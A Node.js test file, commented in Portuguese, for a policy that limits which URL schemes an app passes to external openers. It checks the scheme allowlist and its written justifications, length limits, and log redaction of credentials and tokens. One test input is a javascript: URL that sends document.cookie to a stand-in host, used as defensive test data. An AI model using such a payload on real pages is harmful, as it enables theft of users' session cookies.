const test = require('node:test')
const assert = require('node:assert/strict')

const {
  EXTERNAL_OPENER_SCHEMES,
  EXTERNAL_WEB_SCHEMES,
  MAX_EXTERNAL_URL_CHARS,
  classifyExternalUrl,
  describeExternalUrlForLog,
} = require('./external-url-policy.cjs')
const { casos } = require('./external-url-policy.cases.json')
const policy = require('./external-url-policy.json')

for (const caso of casos) {
  test(`tabela: ${JSON.stringify(caso.entrada)} → ${caso.esperado}`, () => {
    const schemes = caso.esquemas === 'web' ? EXTERNAL_WEB_SCHEMES : EXTERNAL_OPENER_SCHEMES
    const decision = classifyExternalUrl(caso.entrada, schemes)

    if (caso.esperado === 'ok') {
      assert.deepEqual(decision, { ok: true, url: caso.url, scheme: new URL(caso.url).protocol })
    } else {
      assert.equal(decision.ok, false)
      assert.equal(decision.reason, caso.esperado)
    }
  })
}

test('toda entrada da allowlist tem justificativa escrita e nenhum esquema perigoso entrou', () => {
  // "Não ampliar allowlist sem justificativa e teste": um esquema novo sem
  // texto em `justificativas` falha aqui antes de chegar a qualquer opener.
  for (const scheme of policy.esquemasDoAbridor) {
    assert.ok(policy.justificativas[scheme], `sem justificativa para ${scheme}`)
  }
  assert.deepEqual([...EXTERNAL_OPENER_SCHEMES].sort(), ['http:', 'https:', 'mailto:'])
  assert.ok(EXTERNAL_WEB_SCHEMES.every((scheme) => EXTERNAL_OPENER_SCHEMES.includes(scheme)))
})

test('recusa entrada que não é texto sem lançar', () => {
  for (const value of [undefined, null, 42, {}, ['https://example.com'], new URL('https://example.com')]) {
    assert.deepEqual(classifyExternalUrl(value), { ok: false, reason: 'vazia' })
  }
})

test('recusa URL maior que o limite, que nenhum opener de sistema aceita inteira', () => {
  const base = 'https://example.com/'
  const noLimite = base + 'a'.repeat(MAX_EXTERNAL_URL_CHARS - base.length)
  assert.equal(classifyExternalUrl(noLimite).ok, true)
  assert.deepEqual(classifyExternalUrl(`${noLimite}a`), { ok: false, reason: 'longa' })
})

test('o limite vale para o href serializado, não só para o texto cru', () => {
  // 1044 caracteres crus viram mais de 9 mil no href: cada ideograma sai como %XX%XX%XX.
  const cjk = 'https://zh.wikipedia.org/w/index.php?search=' + '中'.repeat(1000)
  assert.ok(cjk.length < MAX_EXTERNAL_URL_CHARS)
  assert.deepEqual(classifyExternalUrl(cjk), { ok: false, reason: 'longa', scheme: 'https:' })
})

test('a descrição para log leva só esquema e host', () => {
  assert.equal(
    describeExternalUrlForLog('https://pessoa:senha@example.com:8443/convite/TOKEN?assinatura=SEGREDO#x'),
    'https://example.com:8443',
  )
  assert.equal(describeExternalUrlForLog('mailto:pessoa@example.com?body=SEGREDO'), 'mailto:…')
  assert.equal(describeExternalUrlForLog('javascript:fetch("//x/"+document.cookie)'), 'javascript:…')
  assert.equal(describeExternalUrlForLog('C:\\Users\\pessoa\\SEGREDO.txt'), 'c:…')
  assert.equal(describeExternalUrlForLog('sem esquema SEGREDO'), '[sem esquema]')
  assert.equal(describeExternalUrlForLog(''), '[vazia]')
  assert.equal(describeExternalUrlForLog(undefined), '[vazia]')
})
